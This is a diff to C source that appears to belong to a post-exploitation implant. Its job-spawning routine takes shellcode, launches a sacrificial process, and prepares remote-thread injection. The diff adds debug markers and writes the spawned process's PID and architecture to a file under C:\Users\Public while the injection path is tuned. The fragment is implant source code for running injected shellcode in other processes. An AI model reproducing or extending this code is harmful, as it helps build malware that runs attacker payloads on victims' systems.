@@ -224,6 +224,7 @@ void command_inject_pid_ping(char * buffer, int length, void(*cb)(char * buffer,
 }
 
 void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellcode, DWORD slen, char * parameter, DWORD plen, char * description, DWORD dlen, BOOL x86, BOOL ignoreToken) {
+	x86_bc("2");
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	SECURITY_ATTRIBUTES sa;
@@ -243,7 +244,9 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 	sa.bInheritHandle = TRUE;
 
 	/* we're going to setup an stdout pipe only */
+	x86_bc("3");
 	CreatePipe(&read_stdout, &newstdout, &sa, 1024 * 1024);
+	x86_bc("4");
 
 	/* further process our startup info data structure */
 	GetStartupInfo(&si);
@@ -257,6 +260,21 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 	if (!spawn_patsy(x86, ignoreToken, &si, &pi)) {
 		token_guard_stop_maybe(ignoreToken);
 		return;
+	}
+
+	{
+		HANDLE hf;
+		char line[80];
+		DWORD nw = 0;
+		int n;
+		hf = CreateFileA("C:\\Users\\Public\\x86ea2.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hf != INVALID_HANDLE_VALUE) {
+			n = _snprintf(line, sizeof(line), "spawn_x86=%d pid=%u target64=%d\r\n",
+				(int)x86, (unsigned)pi.dwProcessId, (int)is_x64_process(pi.hProcess));
+			if (n > 0)
+				WriteFile(hf, line, (DWORD)n, &nw, NULL);
+			CloseHandle(hf);
+		}
 	}
 
 	/* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
